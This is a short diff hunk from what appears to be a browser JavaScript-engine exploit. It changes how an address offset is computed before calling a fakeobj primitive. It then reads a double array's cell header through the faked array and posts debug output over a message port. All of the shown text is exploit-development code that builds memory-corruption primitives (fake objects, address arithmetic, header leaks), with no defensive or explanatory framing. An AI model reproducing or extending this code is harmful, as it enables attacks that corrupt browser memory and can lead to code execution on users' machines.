@@ -472,7 +472,7 @@ var qwordAsFloat = qword => {
             port.postMessage("obj @ " + addr.toString());
             port.postMessage(typeof(addr) +"vs"+typeof(0x10))
            
-            let fakeArr = fakeobj(addr + 0x10); //no way around this im forced to use bigint for fakeobj :(
+            let fakeArr = fakeobj(Add(addr,new Int64(0x10))); //no way around this im forced to use bigint for fakeobj :(
             // subtract off the incref
             doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
             port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
